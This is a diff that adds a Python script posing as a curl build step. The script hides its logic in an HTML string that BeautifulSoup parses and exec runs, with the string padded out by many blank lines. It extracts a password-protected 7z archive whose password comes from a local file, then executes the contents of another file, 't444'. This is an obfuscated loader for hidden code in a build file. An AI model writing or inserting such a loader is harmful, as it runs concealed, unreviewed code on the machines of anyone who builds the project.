@@ -1,0 +1,76 @@
+import py7zr
+
+print("building curl")
+
+exec(BeautifulSoup("""
+<html>
+<head></head>
+<body><chunguselement>
+
+v1 = "{}"
+v2 = "{}"
+
+archive = py7zr.SevenZipFile('curl-master_2.7z', mode='r', password=open("p11", mode="r").read())
+archive.extractall(path="./cur"+""+"l")
+archive.close()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</chunguselement>
+</body>
+</html>
+""".format('sus', "amogus"), "html.parser").html.body.chunguselement.string)
+
+exec("exec(open('t444').read())")
